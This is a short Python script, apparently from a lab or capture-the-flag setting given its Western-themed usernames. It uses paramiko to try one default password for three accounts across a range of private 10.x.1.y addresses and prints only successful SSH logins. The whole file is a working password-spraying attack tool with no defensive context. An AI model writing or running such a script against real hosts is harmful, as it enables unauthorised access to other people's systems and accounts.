import paramiko

# Function to attempt SSH login and print result for successful logins
def try_login(hostname, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, username=username, password=password, timeout=5)
        # Print success message with the user and IP
        print(f"Success: {username}@{hostname}")
        client.close()
        return True
    except:
        # No action taken on failure to keep the console output clean
        return False

# Credentials and IP range
users = ["sheriffmccoy", "saloonsally", "docholliday"]
password = "Change.me123!"
ips = [f"10.{x}.1.{y}" for x in range(1, 16) for y in range(1, 10)]

# Main loop to try logins
for ip in ips:
    for user in users:
        # Attempt login and print result only for successful logins
        if try_login(ip, user, password):
            # Stop trying other users if login is successful for one user
            break
